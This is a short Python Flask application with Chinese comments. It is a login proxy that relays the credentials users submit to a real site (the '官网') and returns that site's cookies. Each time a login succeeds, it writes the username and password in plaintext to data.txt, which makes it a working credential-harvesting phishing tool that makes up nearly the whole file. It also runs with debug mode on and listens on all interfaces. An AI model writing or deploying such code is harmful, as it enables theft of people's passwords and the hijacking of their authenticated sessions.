from flask import Flask, render_template, request, redirect, make_response
app = Flask(__name__)
import requests
import os
import secrets

# 允许抓包和代理访问
app.config['DEBUG'] = True
# 设置 SERVER_NAME 为 None，使用 IP 地址
app.config['SERVER_NAME'] = None

# 用于存储有效令牌的全局变量（在实际应用中应使用数据库）
valid_tokens = set()

@app.route('/')
def home():
    token = request.cookies.get('auth_token')
    if token and token in valid_tokens:
        return redirect(f'http://{request.host.split(":")[0]}:5000/index')
    return redirect('/login')

@app.route('/login', methods=['GET', 'POST'])
def login():
    token = request.cookies.get('auth_token')
    if token and token in valid_tokens:
        return redirect(f'http://{request.host.split(":")[0]}:5000/index')
    else:
        # 清除无效的 cookie
        response = make_response(render_template('login.html'))
        response.set_cookie('auth_token', '', expires=0)
        response.set_cookie('username', '', expires=0)
        if request.method == 'POST':
            username = request.form['username']
            password = request.form['password']
            # 将用户输入以POST方式提交给官网
            response = requests.post(f'http://{request.host.split(":")[0]}:5000/login', data={'username': username, 'password': password}, allow_redirects=False)
            if response.status_code == 302 and 'Location' in response.headers and response.headers['Location'].endswith('/index'):
                with open('data.txt', 'a') as f:
                    f.write(f"{username}:{password}\n")
                # 生成一个安全的随机令牌
                new_token = secrets.token_hex(16)
                valid_tokens.add(new_token)
                # 从官网响应中提取 cookies
                cookies = response.cookies
                response = make_response(redirect(f'http://{request.host.split(":")[0]}:5000/index'))
                response.set_cookie('auth_token', new_token, max_age=3600, domain=request.host.split(":")[0])  # Cookie 有效期为1小时
                response.set_cookie('username', username, max_age=3600, domain=request.host.split(":")[0])
                # 将官网的 cookies 传递给客户端
                for cookie in cookies:
                    response.set_cookie(cookie.name, cookie.value, max_age=3600, domain=request.host.split(":")[0])
                return response
            else:
                return render_template('login.html', error='用户名或密码错误')
        return response

if __name__ == '__main__':
    app.run(debug=True, port=5001, host='0.0.0.0', ssl_context=None)
